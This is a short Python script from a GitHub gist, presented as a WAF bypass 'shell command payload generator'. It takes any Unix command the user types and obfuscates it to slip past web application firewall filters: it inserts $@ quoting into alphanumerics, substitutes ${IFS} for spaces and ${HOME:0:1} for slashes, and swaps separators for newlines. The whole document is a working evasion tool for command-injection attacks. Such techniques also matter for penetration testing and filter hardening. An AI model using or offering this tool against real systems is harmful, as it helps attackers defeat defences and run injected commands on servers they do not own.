#date: 2021-12-15T17:05:13Z
#url: https://api.github.com/gists/7b20a134c89d0951da700776561ae803
#owner: https://api.github.com/users/checksumUK

"""
 *- date: 19.11.2021
 *- Simple WAF *nix shell command payload generator >:)
"""

import string

# constants
CHARACTERSET = string.ascii_letters + string.digits # all alphanumeric characters


__version__ = 1.0

BANNER = f'\n\tWAF *nix shell command payload generator v{__version__} by\n'


def command_obfuscation(cmd):
    

    final_cmd = ''
    first_arg = True

    for char in cmd:
        # """ here is where we bypass restricted commands / characters """    

        if char in CHARACTERSET:
            char = f'$@\'{char}\'' if first_arg else f'$@{char}'

        # bypass space character restrictions
        elif char == ' ':
            char = '${IFS}'

            first_arg = False

        # bypass command seperator characters restrictions e.g. && or ; 
        elif char in ';&|':
            char = '\n' 

            first_arg = True

        elif char == '/':
            char = '${HOME:0:1}' # ${HOME:0:1} is equal to /

        final_cmd += char

    return final_cmd


if __name__ == '__main__':
    print(BANNER)

    cmd = input('cmd > ')
    obfuscated_cmd = command_obfuscation(cmd)

    print(f'[^_^] command obfuscated:')
    print(obfuscated_cmd)